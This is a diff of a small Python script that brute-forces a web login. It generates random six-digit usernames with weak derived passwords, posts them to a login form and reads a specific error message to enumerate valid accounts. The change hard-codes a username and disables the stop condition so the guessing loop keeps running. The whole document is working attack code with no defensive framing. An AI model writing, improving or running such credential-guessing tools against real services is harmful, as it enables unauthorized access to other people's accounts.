@@ -1,13 +1,13 @@
 import requests, threading, time, random
 dictionarys = []
-username = ''
+username = '15103'
 password = ''
 isRun = True
 def getRun():
-    df = open('x.txt', 'r', encoding='utf-8')
+    df = open('username.txt', 'r', encoding='utf-8')
     return df.read()
 def setRun(x):
-    df = open('x.txt', 'w')
+    df = open('username.txt', 'w',encoding='utf-8')
     df.writelines(str(x))
     df.close()
 def randomNumber(main,length):
@@ -25,7 +25,6 @@ def run():
         print(f"count username Faild : ${len(dictionarys)}",end='\r')
         if getRun()=='0': return
         username = randomNumber("1",6)
-        # print(username)
         password = username[0:3]
         dictionarys.append(username)
         data = {
@@ -40,7 +39,7 @@ def run():
             for i in res:
                 if "Loginname or Password is invalid! (2)" in str(i):
                     print(f"Username successfully ${username}")
-                    setRun(0)
+                    # setRun(0)
         except:
             pass
         time.sleep(0.1)
